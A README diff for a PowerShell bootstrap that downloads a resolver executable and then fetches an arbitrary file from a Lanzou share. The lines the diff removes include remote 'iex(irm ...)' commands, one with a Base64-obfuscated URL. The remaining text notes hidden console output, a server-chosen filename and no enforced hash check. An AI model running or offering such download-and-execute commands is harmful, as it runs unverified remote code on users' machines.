@@ -7,31 +7,18 @@ PowerShell bootstrap for downloading a file from a Lanzou share link.
 - `Colud.ps1` - public PowerShell bootstrap script.
 - `Download.exe` - self-contained C++ resolver using WinHTTP.
 
-## Plain usage
-
-```powershell
-iex(irm "https://vtlowkey.github.io/bootstrap/Colud.ps1")
-```
-
-## Base64-encoded entry URL
-
-The entry URL can be encoded with Base64 so it is not shown as plaintext in the command:
-
-```powershell
-$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly92dGxvd2tleS5naXRodWIuaW8vYm9vdHN0cmFwL0NvbHVkLnBzMQ=="));iex(irm $u)
-```
-
-Base64 is encoding, not encryption. Anyone can decode it.
-
 ## What it does
 
 1. Downloads `Download.exe` to `%TEMP%`.
-2. Resolves the configured Lanzou share link.
 3. Downloads the target file using its original name.
-4. Prints the downloaded file SHA256.
 5. Deletes the temporary resolver.
-
-The resolver does not use a fixed `Download.exe` SHA256 check. The output filename is taken from the server, so it can be `Core.dll` or any other name. Set `$OutFile` only when you want to force a specific path.
 
 Only execute scripts and binaries from sources you trust.
 
+## Current behavior
+
+- Shows a single progress bar with the activity text `正在云解析`.
+- Resolver console output is captured and not shown.
+- The downloaded file is saved to the current user's Desktop by default.
+- The original remote filename is preserved.
+- The script prints the downloaded file SHA256 but does not enforce a fixed hash.
